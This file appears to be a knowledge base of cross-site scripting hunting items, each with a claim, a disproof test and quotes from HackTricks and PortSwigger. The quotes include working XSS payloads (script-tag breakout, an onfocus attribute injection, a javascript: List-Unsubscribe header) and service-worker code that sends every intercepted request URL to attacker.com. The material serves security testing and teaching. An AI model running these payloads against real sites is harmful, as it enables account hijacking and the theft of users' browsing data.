@@ -1,0 +1,245 @@
+{
+ "class_id": "xss",
+ "items": [
+  {
+   "item_key": "xss.prerequisite.ht_script_src_self_unsafe_eval",
+   "kind": "prerequisite",
+   "claim": "An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable \u2014 'unsafe-eval' in the policy buys the tester nothing here.",
+   "body": "An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable \u2014 'unsafe-eval' in the policy buys the tester nothing here.\n\nHackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)",
+   "disproof": "An inline event handler payload firing on a page whose script-src carries only 'unsafe-eval', with no 'unsafe-inline', no matching hash or nonce, and no other executable gadget, refutes this gating.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "\"script-src 'self' 'unsafe-eval'; object-src 'self';\"\n\n\nHowever, 'unsafe-eval' does not authorize inline event handlers such as this payload's onerror; that requires 'unsafe-inline', a matching hash/nonce mechanism where applicable, or another executable gadget."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.technique.ht_classify_the_final_execution_conte",
+   "kind": "technique",
+   "claim": "The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.",
+   "body": "The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.\n\nHackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)",
+   "disproof": "A payload that reaches a DOM sink and executes as page JavaScript from a Manifest V3 service worker, or a sandboxed page that inherits the host extension's CSP and APIs, refutes this context-based split.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "Classify the final execution context before assessing impact:<sup>[[8]](#references)[[9]](#references)</sup>\n Context | What successful injection normally gains | What to verify |\n Host-page DOM modified by a content script | JavaScript in the web page's main world, not automatic access to the content script's isolated-world privileges | Page CSP and whether a DOM or window.postMessage bridge forwards attacker data to the content script |\n Ordinary extension page (popup, options page, or reachable extension HTML) | The extension origin and the extension APIs available to that page | The extension-page CSP, manifest permissions, and any runtime-message handlers reachable from the page |\n Manifest V2 background page | A privileged extension page with a DOM | Whether attacker data reaches an HTML/code-execution sink through messaging or stored state |\n Manifest V3 service worker | No DOM, so this is a message/API or code-injection review rather than DOM XSS | Untrusted messages, unsafe URL/API arguments, and dynamic-code sinks |\n Page listed in sandbox.pages | Script allowed by the sandbox's separate CSP, but in a unique origin without extension APIs or direct access to non-sandboxed pages | Whether a privileged parent trusts messages from the sandbox and exposes an unsafe postMessage bridge |\n\nThe sandbox case is an important exception to the usual MV3 CSP rule."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.signal.ht_the_problematic_javascript_part_o",
+   "kind": "signal",
+   "claim": "The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.",
+   "body": "The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.\n\nHackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)",
+   "disproof": "A concatenating handler whose value is escaped or inserted as text before the append, so the same input renders as literal characters with no new element or handler, refutes this sink pattern.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "The problematic JavaScript, part of bookmarks.js, is detailed below:\n\njavascript\n$(\"#btAdd\").on(\"click\", function () {\n var bookmarkName = $(\"#txtName\").val()\n if (\n $(\".custom-button .label\").filter(function () {\n return $(this).text() === bookmarkName\n }).length\n )\n return false\n\n var bookmarkItem = $('<div class=\"custom-button\">')\n bookmarkItem.html('<span class=\"label\">' + bookmarkName + \"</span>\")\n bookmarkItem.append('<button class=\"remove-btn\" title=\"delete\">x</button>')\n bookmarkItem.attr(\"data-title\", bookmarkName)\n bookmarkItem.data(\"timestamp\", new Date().getTime())\n $(\"section.bookmark-container .existing-items\").append(bookmarkItem)\n persistData()\n})\n\n\nThis snippet fetches the value from the txtName input field and uses string concatenation to generate HTML, which is then appended to the DOM using jQuery\u2019s .append() function.<sup>[[2]](#references)</sup>\n\nChrome's extension CSP normally prevents inline script and eval-like execution."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.signal.ht_this_is_not_trivial_as_modern_brow",
+   "kind": "signal",
+   "claim": "Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.",
+   "body": "Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.\n\nHackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)",
+   "disproof": "Script executing from a payload delivered only in the body of a 302 response, in a browser that follows the redirect before parsing, refutes this claim.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "This is not trivial as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.technique.ht_escaping_script_tag_if_your_co",
+   "kind": "technique",
+   "claim": "When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.",
+   "body": "When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.\n\nHackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)",
+   "disproof": "A reflected value containing a closing script tag sequence that neither terminates the block nor produces any new element or handler in the rendered page refutes the escapability.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "Escaping \\<script> tag\n\nIf your code is inserted within <script> [...] var input = 'reflected data' [...] </script> you could easily escape closing the <script> tag:\n\njavascript\n</script><img src=1 onerror=alert(document.domain)>\n\n\nNote that in this example we haven't even closed the single quote."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.variant.ht_observe_the_stored_xss_primitive",
+   "kind": "variant",
+   "claim": "A stored-XSS sink can sit in a message header rather than a web request: the payload is stored alongside the message and later rendered by the mail client, where one click is enough to run it, so mail-rendering paths deserve the same stored-XSS attention as web pages.",
+   "body": "A stored-XSS sink can sit in a message header rather than a web request: the payload is stored alongside the message and later rendered by the mail client, where one click is enough to run it, so mail-rendering paths deserve the same stored-XSS attention as web pages.\n\nHackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)",
+   "disproof": "A stored message whose header payload the client never renders, or which needs more than the single user click to execute, refutes this stored-XSS primitive.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "Observe the stored-XSS primitive: the payload persists with the email and only requires a click to execute.\n\ntext\nList-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>\nList-Unsubscribe-Post:"
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.impact.ht_for_example_javascript_var_sw",
+   "kind": "impact",
+   "claim": "An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.",
+   "body": "An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.\n\nHackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)",
+   "disproof": "A malicious worker that stops intercepting requests within 24 hours of the site serving a changed script refutes the persistence claim.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "For example:\n\njavascript\nvar sw =\n \"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//\"\n\n\nShadow Workers is a command-and-control framework dedicated to service-worker exploitation.<sup>[[4]](#references)</sup>\n\nService-worker update checks bypass the browser cache when the previous fetch occurred more than 24 hours ago, but that does not guarantee that a malicious worker disappears within 24 hours: the old worker can remain active until a changed script is fetched, installed, and activated."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.prerequisite.ht_attack_creating_a_service_worker",
+   "kind": "prerequisite",
+   "claim": "Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.",
+   "body": "Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.\n\nHackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)",
+   "disproof": "Registering and controlling a worker script on the origin with neither arbitrary-JS hosting nor a JSONP endpoint that can be made to emit arbitrary JS refutes these as the required prerequisites.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "Attack Creating a Service Worker\n\nIn order to exploit this vulnerability you need to find:\n\n- A way to upload arbitrary JS files to the server and a XSS to load the service worker of the uploaded JS file\n- A vulnerable JSONP request where you can manipulate the output (with arbitrary JS code) and a XSS to load the JSONP with a payload that will load a malicious service worker."
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object"
+    }
+   ]
+  },
+  {
+   "item_key": "xss.prerequisite.ht_this_is_the_code_that_must_be_uplo",
+   "kind": "prerequisite",
+   "claim": "The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.",
+   "body": "The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.\n\nHackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)",
+   "disproof": "A fetch-listener worker registered and intercepting traffic from a script hosted off the vulnerable origin, or a JSONP response whose callback cannot be broken out of, refutes the origin-delivery requirement.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+     "source_type": "reference",
+     "host": "raw.githubusercontent.com",
+     "publisher": "hacktricks",
+     "quote": "This is the code that must be uploaded to the vulnerable origin or returned through a vulnerable JSONP endpoint:\n\njavascript\nself.addEventListener(\"fetch\", (event) => {\n event.waitUntil(\n fetch(\"https://attacker.com/fetch_url/\" + encodeURIComponent(event.request.url), {\n mode:"
+    },
+    {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+     "source_type": "research",
+     "host": "portswigger.net",
+     "publisher": "portswigger.net",
+     "quote": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object"
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "hacktricks",
+  "portswigger.net"
+ ],
+ "sources": [
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "https://portswigger.net/web-security/cross-site-scripting/contexts",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "https://portswigger.net/web-security/cross-site-scripting/contexts",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "https://portswigger.net/web-security/cross-site-scripting/contexts",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+  "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+  "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+  "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+  "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "https://portswigger.net/web-security/cross-site-scripting/dom-based"
+ ]
+}
